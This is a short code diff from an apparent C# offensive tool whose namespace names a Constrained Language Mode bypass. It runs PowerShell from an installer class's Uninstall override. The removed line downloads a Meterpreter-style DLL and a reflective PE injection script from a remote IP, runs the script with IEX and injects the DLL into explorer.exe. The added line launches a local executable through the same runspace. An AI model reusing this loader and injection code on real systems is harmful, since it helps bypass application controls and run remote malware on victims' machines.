@@ -18,7 +18,7 @@ namespace singlefire_clmbypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.178/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+            String cmd = "C:\\Users\\will\\Desktop\\classical.exe";
 
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
